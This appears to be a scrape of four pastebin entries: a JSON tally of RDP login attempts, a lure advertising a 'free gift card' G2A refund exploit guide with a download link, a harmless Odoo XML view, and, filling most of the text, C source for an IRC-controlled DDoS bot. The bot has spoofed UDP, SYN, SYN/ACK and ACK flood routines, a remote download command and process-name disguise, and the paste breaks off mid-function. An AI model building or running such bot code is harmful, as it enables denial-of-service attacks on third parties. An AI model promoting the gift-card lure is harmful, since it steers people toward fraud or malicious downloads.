id,title,username,language,date,content
npn7icZn,2024-02-18_stats.json,rdp_snitch,JSON,Sunday 18th of February 2024 06:15:08 PM CDT,"{
  ""ip"": {
    ""45.227.254.55"": 2,
    ""194.165.16.78"": 4,
    ""173.239.214.30"": 1,
    ""185.196.220.41"": 3,
    ""193.142.146.227"": 3,
    ""205.210.31.65"": 3,
    ""172.206.250.19"": 1,
    ""212.70.149.142"": 5,
    ""87.251.75.145"": 3,
    ""167.94.138.125"": 1,
    ""194.165.16.76"": 2,
    ""185.170.144.3"": 2,
    ""36.91.222.100"": 1,
    ""205.210.31.184"": 3,
    ""45.227.254.48"": 2,
    ""38.130.226.109"": 1,
    ""103.192.198.60"": 2,
    ""200.35.53.121"": 1,
    ""61.91.43.232"": 1,
    ""185.170.144.113"": 3,
    ""179.60.147.129"": 1,
    ""118.193.32.88"": 1,
    ""45.137.201.204"": 1,
    ""205.210.31.168"": 3,
    ""167.248.133.38"": 1,
    ""87.251.75.64"": 1,
    ""45.131.195.114"": 1,
    ""120.240.145.8"": 1,
    ""45.93.20.204"": 3,
    ""194.165.16.72"": 2,
    ""167.94.145.55"": 1,
    ""198.235.24.201"": 3,
    ""79.124.62.106"": 1,
    ""149.34.246.34"": 1,
    ""216.24.210.126"": 1
  },
  ""asn"": {
    ""AS267784"": 4,
    ""AS48721"": 8,
    ""AS62240"": 3,
    ""AS208046"": 6,
    ""AS396982"": 12,
    ""AS8075"": 1,
    ""AS204428"": 5,
    ""AS208091"": 4,
    ""AS398324"": 2,
    ""AS197414"": 5,
    ""AS7713"": 1,
    ""AS13886"": 1,
    ""AS59187"": 2,
    ""AS27695"": 1,
    ""AS7470"": 1,
    ""AS209588"": 1,
    ""AS135377"": 1,
    ""AS49581"": 1,
    ""AS56040"": 1,
    ""AS57523"": 3,
    ""AS398705"": 1,
    ""AS207812"": 1,
    ""AS212238"": 1
  },
  ""isp"": {
    ""Flyservers S.A."": 13,
    ""LogicWeb Inc."": 1,
    ""ColocationX Ltd."": 6,
    ""Google LLC"": 12,
    ""Microsoft"": 1,
    ""SS-Net"": 5,
    ""Xhost Internet Solutions LP"": 9,
    ""Censys, Inc."": 3,
    ""PT Telekomunikasi Indonesia"": 1,
    ""Cloud South"": 1,
    ""Neevai Supercloud PVT LTD"": 2,
    ""Edatel S.a. E.S.P"": 1,
    ""True Internet Corporation CO. Ltd."": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Ferdinand Zink trading as Tube-Hosting"": 1,
    ""VPN"": 1,
    ""China Mobile communications corporation"": 1,
    ""Chang Way Technologies Co. Limited"": 3,
    ""DM AUTO EOOD"": 1,
    ""Datacamp Limited"": 1,
    ""Clouvider Limited"": 1
  },
  ""org"": {
    ""UAB Host Baltic"": 4,
    ""Flyservers S.A"": 8,
    ""NSQ-VENTURE"": 1,
    ""Makut Investments"": 3,
    ""ColocationX Ltd"": 3,
    ""Palo Alto Networks, Inc"": 12,
    ""Microsoft Azure Cloud (eastus)"": 1,
    ""4Media Ltd"": 5,
    ""Xhost Internet Solutions"": 4,
    ""Censys, Inc"": 1,
    ""Xhostis"": 5,
    ""Telekomunikasi Indonesia"": 1,
    ""Cloud South"": 1,
    ""Neevai Supercloud PVT LTD"": 2,
    ""Edatel S.a. E.S.P"": 1,
    ""True Internet Corporation CO. LTD"": 1,
    ""Cloud Solutions S.A"": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Taurus"": 1,
    ""Censys, Inc."": 2,
    ""VPN-Consumer-US"": 1,
    ""China Mobile"": 1,
    ""Starcrecium Limited"": 3,
    ""Internet Solutions & Innovations LTD"": 1,
    ""Datacamp Limited"": 1,
    ""IPXO"": 1
  },
  ""regionName"": {
    ""Vilnius"": 4,
    ""Kaunas"": 8,
    ""New Jersey"": 2,
    ""Virginia"": 4,
    ""North Holland"": 12,
    ""California"": 13,
    ""Plovdiv"": 5,
    ""Michigan"": 2,
    ""Jakarta"": 1,
    ""Florida"": 1,
    ""Madhya Pradesh"": 2,
    ""Antioquia"": 1,
    ""Bangkok"": 1,
    ""Distrito Federal"": 1,
    ""Kowloon"": 1,
    ""Lombardy"": 1,
    ""Guangdong"": 1,
    ""Moscow"": 3,
    ""Hesse"": 2,
    ""English River"": 1
  },
  ""country"": {
    ""Lithuania"": 12,
    ""United States"": 22,
    ""The Netherlands"": 12,
    ""Bulgaria"": 5,
    ""Indonesia"": 1,
    ""India"": 2,
    ""Colombia"": 1,
    ""Thailand"": 1,
    ""Venezuela"": 1,
    ""Hong Kong"": 1,
    ""Italy"": 1,
    ""China"": 1,
    ""Russia"": 3,
    ""Germany"": 2,
    ""Seychelles"": 1
  },
  ""account"": {
    ""Test"": 14,
    ""(empty)"": 8,
    ""Domain"": 12,
    ""nlHOiOUso"": 1,
    ""yqrSRV"": 1,
    ""rYsptK"": 1,
    ""hello"": 5,
    ""Administr"": 13,
    ""zkddjUWoL"": 1,
    ""XmFZgS"": 1,
    ""eAWPKV"": 1,
    ""a"": 1,
    ""Administrator"": 1,
    ""XHKjYrxdI"": 1,
    ""EQHnvu"": 1,
    ""dYEwCt"": 1,
    ""jKTWmDOXJ"": 1,
    ""UUZpmx"": 1,
    ""yzEcZK"": 1
  },
  ""keyboard"": {
    ""Unknown"": 66
  },
  ""client_build"": {
    ""Unknown"": 66
  },
  ""client_name"": {
    ""Unknown"": 66
  },
  ""ip_type"": {
    ""Unknown"": 41,
    ""hosting & proxy"": 2,
    ""mobile"": 4,
    ""hosting"": 15,
    ""proxy"": 3,
    ""mobile & hosting & proxy"": 1
  }
}"
AiXDrfPx,G2A.com Free Gift Card Guide Feb 2024,ounnuo,GetText,Sunday 18th of February 2024 05:40:48 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_181721.pdf
 
Working as of
18 February 2024"
EFMNTPWX,Odoo's XML,thecowmilk,XML,Sunday 18th of February 2024 04:33:21 PM CDT,"<record id=""open_hotel_get_dates_tree"" model=""ir.actions.act_window"">
    <field name=""name"">Get Calendar Files</field>
    <field name=""type"">ir.actions.act_window</field>
    <field name=""res_model"">hotel.getdates</field>
    <field name=""view_mode"">form</field>
    <field name=""context"">{'form_view_initial_mode': 'view', 'default_res_id': 'hotel.getdates,get_first_record_id()'}</field>
    </record>



    <record id=""view_hotel_getdates_files"" model=""ir.ui.view"">
    <field name=""name"">Get Calendar Files</field>
    <field name=""model"">hotel.getdates</field>
    <field name=""arch"" type=""xml"">
        <form string=""Get Dates"" create=""false"">
            <sheet>

                <group>
                    <field name=""date_selector"" widget=""one2many_list"">
                        <tree>
                            <field name=""name""/>
                            <field name=""dates""/>
                        </tree>
                    </field>
                </group>

            </sheet>
        </form>
    </field>
</record>"
MTYRPuWt,ktx.c IRC bot,GTAXL,C,Sunday 18th of February 2024 04:24:17 PM CDT,"/*
	This source attacks are almost completly rewrited by Dr.Simone Luchetta
	(Helel Ben-Shachar, The Shining One, Son of the Dawn!)
	I've implemented some new attacks with correct offset, checksum,
	sequences and acknowledgement's number (NOW WITH NO-SPOOF).
	There are presents: ackflood, the infamous nsackflood, an improved
	version of synflood and others (like randomflood).
	Please edit INADDR_ANY part for a correct packet sending.
	Dr. Simone Luchetta, <simoneluchetta at gmail.com>
	MSN: <simoneluchetta at gmail.com>
*/

#undef STARTUP
#undef IDENT
#define FAKENAME ""-dbus""
#define CHAN ""#ivircheetham""
#undef KEY ""key""
int numservers=1;
char *servers[] = {
	""irc.gtaxl.net"",
	(void*)0
};

#include <stdarg.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <strings.h>
#include <netinet/in.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <signal.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>
#include <sys/wait.h>
#include <sys/ioctl.h>

int sock,changeservers=0;
	char *server, *chan, *nick, *ident, *user, disabled=0, execfile[256],dispass[256];
	unsigned int *pids;
	unsigned long spoofs=0, spoofsm=0, numpids=0;
int strwildmatch(const char* pattern, const char* string) {
	switch(*pattern) {
		case '\0': return *string;
		case '*': return !(!strwildmatch(pattern+1, string) || *string && !strwildmatch(pattern, string+1));
		case '?': return !(*string && !strwildmatch(pattern+1, string+1));
		default: return !((toupper(*pattern) == toupper(*string)) && !strwildmatch(pattern+1, string+1));
	}
}
int Send(int sock, char *words, ...) {
        static char textBuffer[1024];
        va_list args;
        va_start(args, words);
        vsprintf(textBuffer, words, args);
        va_end(args);
        return write(sock,textBuffer,strlen(textBuffer));
}
int mfork(char *sender) {
	unsigned int parent, *newpids, i;
	if (disabled == 1) {
		Send(sock,""NOTICE %s :Unable to comply.\n"",sender);
		return 1;
	}
	parent=fork();
	if (parent <= 0) return parent;
	numpids++;
	newpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));
	for (i=0;i<numpids-1;i++) newpids[i]=pids[i];
	newpids[numpids-1]=parent;
	free(pids);
	pids=newpids;
	return parent;
}
unsigned long getspoof() {
	if (!spoofs) return rand();
	if (spoofsm == 1) return ntohl(spoofs);
	return ntohl(spoofs+(rand() % spoofsm)+1);
}
void filter(char *a) { while(a[strlen(a)-1] == '\r' || a[strlen(a)-1] == '\n') a[strlen(a)-1]=0; }
char *makestring() {
	char *tmp;
	int len=(rand()%5)+4,i;
 	FILE *file;
	tmp=(char*)malloc(len+1);
 	memset(tmp,0,len+1);
 	if ((file=fopen(""/usr/dict/words"",""r"")) == NULL) for (i=0;i<len;i++) tmp[i]=(rand()%(91-65))+65;
	else {
		int a=((rand()*rand())%45402)+1;
		char buf[1024];
		for (i=0;i<a;i++) fgets(buf,1024,file);
		memset(buf,0,1024);
		fgets(buf,1024,file);
		filter(buf);
		memcpy(tmp,buf,len);
		fclose(file);
	}
	return tmp;
}
void identd() {
        int sockname,sockfd,sin_size,tmpsock,i;
        struct sockaddr_in my_addr,their_addr;
        char szBuffer[1024];
        if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) return;
        my_addr.sin_family = AF_INET;
        my_addr.sin_port = htons(113);
        my_addr.sin_addr.s_addr = INADDR_ANY;
        memset(&(my_addr.sin_zero), 0, 8);
        if (bind(sockfd, (struct sockaddr *)&my_addr, sizeof(struct sockaddr)) == -1) return;
        if (listen(sockfd, 1) == -1) return;
        if (fork() == 0) return;
        sin_size = sizeof(struct sockaddr_in);
        if ((tmpsock = accept(sockfd, (struct sockaddr *)&their_addr, &sin_size)) == -1) exit(0);
        for(;;) {
                fd_set bla;
                struct timeval timee;
                FD_ZERO(&bla);
                FD_SET(tmpsock,&bla);
                timee.tv_sec=timee.tv_usec=60;
                if (select(tmpsock + 1,&bla,(fd_set*)0,(fd_set*)0,&timee) < 0) exit(0);
                if (FD_ISSET(tmpsock,&bla)) break;
        }
        i = recv(tmpsock,szBuffer,1024,0);
        if (i <= 0 || i >= 20) exit(0);
        szBuffer[i]=0;
        if (szBuffer[i-1] == '\n' || szBuffer[i-1] == '\r') szBuffer[i-1]=0;
        if (szBuffer[i-2] == '\n' || szBuffer[i-2] == '\r') szBuffer[i-2]=0;
	Send(tmpsock,""%s : USERID : UNIX : %s\n"",szBuffer,ident);
        close(tmpsock);
        close(sockfd);
        exit(0);
}
long pow(long a, long b) {
        if (b == 0) return 1;
        if (b == 1) return a;
        return a*pow(a,b-1);
}
u_short in_cksum(u_short *addr, int len) {
        register int nleft = len;
        register u_short *w = addr;
        register int sum = 0;
        u_short answer =0;
        while (nleft > 1) {
                sum += *w++;
                nleft -= 2;
        }
        if (nleft == 1) {
                *(u_char *)(&answer) = *(u_char *)w;
                sum += answer;
        }
        sum = (sum >> 16) + (sum & 0xffff);
        sum += (sum >> 16);
        answer = ~sum;
        return(answer);
}
void get(int sock, char *sender, int argc, char **argv) {
        int sock2,i,d;
        struct sockaddr_in server;
        unsigned long ipaddr;
        char buf[1024];
        FILE *file;
        unsigned char bufm[4096];
        if (mfork(sender) != 0) return;
        if (argc < 2) {
                Send(sock,""NOTICE %s :GET <host> <save as>\n"",sender);
                exit(0);
        }
        if ((sock2 = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
                Send(sock,""NOTICE %s :Unable to create socket.\n"",sender);
                exit(0);
        }
        if (!strncmp(argv[1],""http://"",7)) strcpy(buf,argv[1]+7);
        else strcpy(buf,argv[1]);
        for (i=0;i<strlen(buf) && buf[i] != '/';i++);
        buf[i]=0;
        server.sin_family = AF_INET;
        server.sin_port = htons(80);
        if ((ipaddr = inet_addr(buf)) == -1) {
                struct hostent *hostm;
                if ((hostm=gethostbyname(buf)) == NULL) {
                        Send(sock,""NOTICE %s :Unable to resolve address.\n"",sender);
                        exit(0);
                }
                memcpy((char*)&server.sin_addr, hostm->h_addr, hostm->h_length);
        }
        else server.sin_addr.s_addr = ipaddr;
        memset(&(server.sin_zero), 0, 8);
        if (connect(sock2,(struct sockaddr *)&server, sizeof(server)) != 0) {
                Send(sock,""NOTICE %s :Unable to connect to http.\n"",sender);
                exit(0);
        }

        Send(sock2,""GET /%s HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\r\nHost: %s:80\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n"",buf+i+1,buf);
        Send(sock,""NOTICE %s :Receiving file.\n"",sender);
        file=fopen(argv[2],""wb"");
        while(1) {
                int i;
                if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
                if (i < 4096) bufm[i]=0;
                for (d=0;d<i;d++) if (!strncmp(bufm+d,""\r\n\r\n"",4)) {
                        for (d+=4;d<i;d++) fputc(bufm[d],file);
                        goto done;
                }
        }
        done:
        Send(sock,""NOTICE %s :Saved as %s\n"",sender,argv[2]);
        while(1) {
                int i,d;
                if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
                if (i < 4096) bufm[i]=0;
                for (d=0;d<i;d++) fputc(bufm[d],file);
        }
        fclose(file);
        close(sock2);
        exit(0);
}
void getspoofs(int sock, char *sender, int argc, char **argv) {
        unsigned long a=spoofs,b=spoofs+(spoofsm-1);
        if (spoofsm == 1) Send(sock,""NOTICE %s :Spoofs: %d.%d.%d.%d\n"",sender,((u_char*)&a)[3],((u_char*)&a)[2],((u_char*)&a)[1],((u_char*)&a)[0]);
        else Send(sock,""NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\n"",sender,((u_char*)&a)[3],((u_char*)&a)[2],((u_char*)&a)[1],((u_char*)&a)[0],((u_char*)&b)[3],((u_char*)&b)[2],((u_char*)&b)[1],((u_char*)&b)[0]);
}
void version(int sock, char *sender, int argc, char **argv) {
        Send(sock,""NOTICE %s :Helel mod 1.0 - Ezba' Elohim\n"",sender);
}
void nickc(int sock, char *sender, int argc, char **argv) {
        if (argc != 1) {
                Send(sock,""NOTICE %s :NICK <nick>\n"",sender);
                return;
        }
        if (strlen(argv[1]) >= 10) {
                Send(sock,""NOTICE %s :Nick cannot be larger than 9 characters.\n"",sender);
                return;
        }
        Send(sock,""NICK %s\n"",argv[1]);
}
void disable(int sock, char *sender, int argc, char **argv) {
        if (argc != 1) {
                Send(sock,""NOTICE %s :DISABLE <pass>\n"",sender);
                Send(sock,""NOTICE %s :Current status is: %s.\n"",sender,disabled?""Disabled"":""Enabled and awaiting orders"");
                return;
        }
	if (disabled) {
		Send(sock,""NOTICE %s :Already disabled.\n"",sender);
		return;
	}
	if (strlen(argv[1]) > 254) {
                Send(sock,""NOTICE %s :Password too long! > 254\n"",sender);
                return;
	}
        disabled=1;
	memset(dispass,0,256);
	strcpy(dispass,argv[1]);
	Send(sock,""NOTICE %s :Disable sucessful.\n"");
}
void enable(int sock, char *sender, int argc, char **argv) {
        if (argc != 1) {
                Send(sock,""NOTICE %s :ENABLE <pass>\n"",sender);
                Send(sock,""NOTICE %s :Current status is: %s.\n"",sender,disabled?""Disabled"":""Enabled and awaiting orders"");
                return;
        }
	if (!disabled) {
		Send(sock,""NOTICE %s :Already enabled.\n"",sender);
		return;
	}
	if (strcasecmp(dispass,argv[1])) {
		Send(sock,""NOTICE %s :Wrong password\n"",sender);
		return;
	}
        disabled=0;
	Send(sock,""NOTICE %s :Password correct.\n"",sender);
}
void spoof(int sock, char *sender, int argc, char **argv) {
        char ip[256];
        int i, num;
        unsigned long uip;
        if (argc != 1) {
                Send(sock,""NOTICE %s :Removed all spoofs\n"",sender);
                spoofs=0;
                spoofsm=0;
                return;
        }
        if (strlen(argv[1]) > 16) {
                Send(sock,""NOTICE %s :What kind of subnet address is that? Do something like: 169.40\n"",sender);
                return;
        }
        strcpy(ip,argv[1]);
        if (ip[strlen(ip)-1] == '.') ip[strlen(ip)-1] = 0;
        for (i=0, num=1;i<strlen(ip);i++) if (ip[i] == '.') num++;
        num=-(num-4);
        for (i=0;i<num;i++) strcat(ip,"".0"");
        uip=inet_network(ip);
        if (num == 0) spoofsm=1;
        else spoofsm=pow(256,num);
        spoofs=uip;
}
struct iphdr {
        unsigned int ihl:4, version:4;
        unsigned char tos;
        unsigned short tot_len;
        unsigned short id;
        unsigned short frag_off;
        unsigned char ttl;
        unsigned char protocol;
        unsigned short check;
        unsigned long saddr;
        unsigned long daddr;
};
struct udphdr {
        unsigned short source;
        unsigned short dest;
        unsigned short len;
        unsigned short check;
};
struct tcphdr {
        unsigned short source;
        unsigned short dest;
        unsigned long seq;
        unsigned long ack_seq;
        unsigned short res1:4, doff:4;
	unsigned char fin:1, syn:1, rst:1, psh:1, ack:1, urg:1, ece:1, cwr:1;
        unsigned short window;
        unsigned short check;
        unsigned short urg_ptr;
};
struct send_tcp {
	struct iphdr ip;
	struct tcphdr tcp;
	char buf[20];
};
struct pseudo_header {
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;
	struct tcphdr tcp;
	char buf[20];
};
unsigned int host2ip(char *sender,char *hostname) {
        static struct in_addr i;
        struct hostent *h;
        if((i.s_addr = inet_addr(hostname)) == -1) {
                if((h = gethostbyname(hostname)) == NULL) {
                        Send(sock, ""NOTICE %s :Unable to resolve %s\n"", sender,hostname);
                        exit(0);
                }
                bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
        }
        return i.s_addr;
}
void udp(int sock, char *sender, int argc, char **argv) {
        unsigned int port,i=0;
        unsigned long psize,target,secs;
        struct sockaddr_in s_in;
        struct iphdr *ip;
	struct udphdr *udp;
	char buf[1500],*str;
        int get;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        if (argc < 3) {
                Send(sock,""NOTICE %s :UDP <target> <port> <secs>\n"",sender);
                exit(1);
        }
        target = host2ip(sender,argv[1]);
        port = atoi(argv[2]);
        secs = atol(argv[3]);
        ip=(void*)buf;
	udp=(void*)(buf+sizeof(struct iphdr));
        str=(void*)(buf+sizeof(struct iphdr)+sizeof(struct udphdr));
        memset(str,10,1500-(sizeof(struct iphdr)+sizeof(struct udphdr)));
        Send(sock,""NOTICE %s :Packeting %s.\n"",sender,argv[1]);
        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 0;
        ip->tot_len = 1500;
        ip->frag_off = 0;
        ip->protocol = 17;
        ip->ttl = 64;
        ip->daddr = target;
        udp->len = htons(psize);
        s_in.sin_family  = AF_INET;
        s_in.sin_addr.s_addr = target;
        for (;;) {
                udp->source = rand();
                if (port) udp->dest = htons(port);
                else udp->dest = rand();
                udp->check = in_cksum((u_short *)buf,1500);
                ip->saddr = getspoof();
                ip->id = rand();
                ip->check = in_cksum((u_short *)buf,1500);
                s_in.sin_port = udp->dest;
                sendto(get,buf,1500,0,(struct sockaddr *)&s_in,sizeof(s_in));
                if (i >= 50) {
                        if (time(NULL) >= start+secs) exit(0);
                        i=0;
                }
                i++;
        }
}
void synflood(int sock, char *sender, int argc, char **argv) {
        struct send_tcp send_tcp;
        struct pseudo_header pseudo_header;
        struct sockaddr_in sin;
        unsigned int syn[20] = { 2,4,5,180,4,2,8,10,0,0,0,0,0,0,0,0,1,3,3,0 }, a=0;
        unsigned int psize=20, source, dest, check;
        unsigned long saddr, daddr,secs;
        int get;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
                Send(sock,""NOTICE %s :SYNFLOOD <target> <port> <secs>\n"",sender);
                exit(1);
        }
        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        {int i; for(i=0;i<20;i++) send_tcp.buf[i]=(u_char)syn[i];}
        daddr=host2ip(sender,argv[1]);
        secs=atol(argv[3]);
        Send(sock,""NOTICE %s :Flooding with TCP SYN %s.\n"",sender,argv[1]);
        send_tcp.ip.ihl = 5;
        send_tcp.ip.version = 4;
        send_tcp.ip.tos = 16;
        send_tcp.ip.frag_off = 64;
        send_tcp.ip.ttl = 64;
        send_tcp.ip.protocol = 6;
        send_tcp.tcp.ack_seq = 0;
        send_tcp.tcp.doff = 10;
        send_tcp.tcp.res1 = 0;
        send_tcp.tcp.cwr = 0;
        send_tcp.tcp.ece = 0;
        send_tcp.tcp.urg = 0;
        send_tcp.tcp.ack = 0;
        send_tcp.tcp.psh = 0;
        send_tcp.tcp.rst = 0;
        send_tcp.tcp.fin = 0;
        send_tcp.tcp.syn = 1;
        send_tcp.tcp.window = 30845;
        send_tcp.tcp.urg_ptr = 0;
        dest=htons(atoi(argv[2]));
        while(1) {
                source=rand();
                if (atoi(argv[2]) == 0) dest=rand();
                saddr=getspoof();
                send_tcp.ip.tot_len = htons(40+psize);
                send_tcp.ip.id = rand();
                send_tcp.ip.saddr = saddr;
                send_tcp.ip.daddr = daddr;
                send_tcp.ip.check = 0;
                send_tcp.tcp.source = source;
                send_tcp.tcp.dest = dest;
                send_tcp.tcp.seq = rand();
                send_tcp.tcp.check = 0;
                sin.sin_family = AF_INET;
                sin.sin_port = dest;
                sin.sin_addr.s_addr = send_tcp.ip.daddr;
                send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
                check = rand();
                send_tcp.buf[9]=((char*)&check)[0];
                send_tcp.buf[10]=((char*)&check)[1];
                send_tcp.buf[11]=((char*)&check)[2];
                send_tcp.buf[12]=((char*)&check)[3];
                pseudo_header.source_address = send_tcp.ip.saddr;
                pseudo_header.dest_address = send_tcp.ip.daddr;
                pseudo_header.placeholder = 0;
                pseudo_header.protocol = IPPROTO_TCP;
                pseudo_header.tcp_length = htons(20+psize);
                bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
                bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
                send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32+psize);
                sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));
                if (a >= 50) {
                        if (time(NULL) >= start+secs) exit(0);
                        a=0;
                }
                a++;
        }
        close(get);
        exit(0);
}

void nssynflood(int sock, char *sender, int argc, char **argv) {
        struct send_tcp send_tcp;
        struct pseudo_header pseudo_header;
        struct sockaddr_in sin;
        unsigned int syn[20] = { 2,4,5,180,4,2,8,10,0,0,0,0,0,0,0,0,1,3,3,0 }, a=0;
        unsigned int psize=20, source, dest, check;
        unsigned long saddr, daddr,secs;
        int get;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
                Send(sock,""NOTICE %s :NSSYNFLOOD <target> <port> <secs>\n"",sender);
                exit(1);
        }
        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        {int i; for(i=0;i<20;i++) send_tcp.buf[i]=(u_char)syn[i];}
        daddr=host2ip(sender,argv[1]);
        secs=atol(argv[3]);
        Send(sock,""NOTICE %s :Flooding with TCP SYN %s.\n"",sender,argv[1]);
        send_tcp.ip.ihl = 5;
        send_tcp.ip.version = 4;
        send_tcp.ip.tos = 16;
        send_tcp.ip.frag_off = 64;
        send_tcp.ip.ttl = 64;
        send_tcp.ip.protocol = 6;
        send_tcp.tcp.ack_seq = 0;
        send_tcp.tcp.doff = 10;
        send_tcp.tcp.res1 = 0;
        send_tcp.tcp.cwr = 0;
        send_tcp.tcp.ece = 0;
        send_tcp.tcp.urg = 0;
        send_tcp.tcp.ack = 0;
        send_tcp.tcp.psh = 0;
        send_tcp.tcp.rst = 0;
        send_tcp.tcp.fin = 0;
        send_tcp.tcp.syn = 1;
        send_tcp.tcp.window = 30845;
        send_tcp.tcp.urg_ptr = 0;
        dest=htons(atoi(argv[2]));
        while(1) {
                source=rand();
                if (atoi(argv[2]) == 0) dest=rand();
                saddr=INADDR_ANY;
                send_tcp.ip.tot_len = htons(40+psize);
                send_tcp.ip.id = rand();
                send_tcp.ip.saddr = saddr;
                send_tcp.ip.daddr = daddr;
                send_tcp.ip.check = 0;
                send_tcp.tcp.source = source;
                send_tcp.tcp.dest = dest;
                send_tcp.tcp.seq = rand();
                send_tcp.tcp.check = 0;
                sin.sin_family = AF_INET;
                sin.sin_port = dest;
                sin.sin_addr.s_addr = send_tcp.ip.daddr;
                send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
                check = rand();
                send_tcp.buf[9]=((char*)&check)[0];
                send_tcp.buf[10]=((char*)&check)[1];
                send_tcp.buf[11]=((char*)&check)[2];
                send_tcp.buf[12]=((char*)&check)[3];
                pseudo_header.source_address = send_tcp.ip.saddr;
                pseudo_header.dest_address = send_tcp.ip.daddr;
                pseudo_header.placeholder = 0;
                pseudo_header.protocol = IPPROTO_TCP;
                pseudo_header.tcp_length = htons(20+psize);
                bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
                bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
                send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32+psize);
                sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));
                if (a >= 50) {
                        if (time(NULL) >= start+secs) exit(0);
                        a=0;
                }
                a++;
        }
        close(get);
        exit(0);
}

void randomflood(int sock, char *sender, int argc, char **argv) {
        struct send_tcp send_tcp;
        struct pseudo_header pseudo_header;
        struct sockaddr_in sin;
        unsigned int syn[20] = { 2,4,5,180,4,2,8,10,0,0,0,0,0,0,0,0,1,3,3,0 }, a=0;
        unsigned int psize=20, source, dest, check;
        unsigned long saddr, daddr,secs;
        int get;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
                Send(sock,""NOTICE %s :RANDOMFLOOD <target> <port> <secs>\n"",sender);
                exit(1);
        }
        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        {int i; for(i=0;i<20;i++) send_tcp.buf[i]=(u_char)syn[i];}

        daddr=host2ip(sender,argv[1]);
        secs=atol(argv[3]);
        dest=htons(atoi(argv[2]));

        Send(sock,""NOTICE %s :Flooding with TCP SYN/ACK %s.\n"",sender,argv[1]);

        send_tcp.ip.ihl = 5;
        send_tcp.ip.version = 4;
        send_tcp.ip.tos = 16;
        send_tcp.ip.frag_off = 64;
        send_tcp.ip.ttl = 255;
        send_tcp.ip.protocol = 6;
        send_tcp.tcp.doff = 5;
        send_tcp.tcp.res1 = 0;
        send_tcp.tcp.cwr = 0;
        send_tcp.tcp.ece = 0;
        send_tcp.tcp.urg = 0;
        send_tcp.tcp.ack = 1;
        send_tcp.tcp.psh = 0;
        send_tcp.tcp.rst = 0;
        send_tcp.tcp.fin = 0;
        send_tcp.tcp.syn = 1;
        send_tcp.tcp.window = 30845;
        send_tcp.tcp.urg_ptr = 0;

        while(1) {
                saddr=getspoof();
                if (atoi(argv[2]) == 0) dest=rand();
                send_tcp.ip.tot_len = htons(40+psize);
                send_tcp.ip.id = rand();
                send_tcp.ip.check = 0;
                send_tcp.ip.saddr = saddr;
                send_tcp.ip.daddr = daddr;
                send_tcp.tcp.source = rand();
                send_tcp.tcp.dest = dest;
                send_tcp.tcp.seq = rand();
                send_tcp.tcp.ack_seq = rand();
                send_tcp.tcp.check = 0;
                sin.sin_family = AF_INET;
                sin.sin_port = send_tcp.tcp.dest;
                sin.sin_addr.s_addr = send_tcp.ip.daddr;
                send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
                check = in_cksum((unsigned short *)&send_tcp, 40);
                pseudo_header.source_address = send_tcp.ip.saddr;
                pseudo_header.dest_address = send_tcp.ip.daddr;
                pseudo_header.placeholder = 0;
                pseudo_header.protocol = IPPROTO_TCP;
                pseudo_header.tcp_length = htons(20+psize);
                bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
                bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
                send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32+psize);
                sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));
                if (a >= 50) {
                        if (time(NULL) >= start+secs) exit(0);
                        a=0;
                }
                a++;
        }
        close(get);
        exit(0);


}



void ackflood(int sock, char *sender, int argc, char **argv) {
        struct send_tcp send_tcp;
        struct pseudo_header pseudo_header;
        struct sockaddr_in sin;
        unsigned int syn[20] = { 2,4,5,180,4,2,8,10,0,0,0,0,0,0,0,0,1,3,3,0 }, a=0;
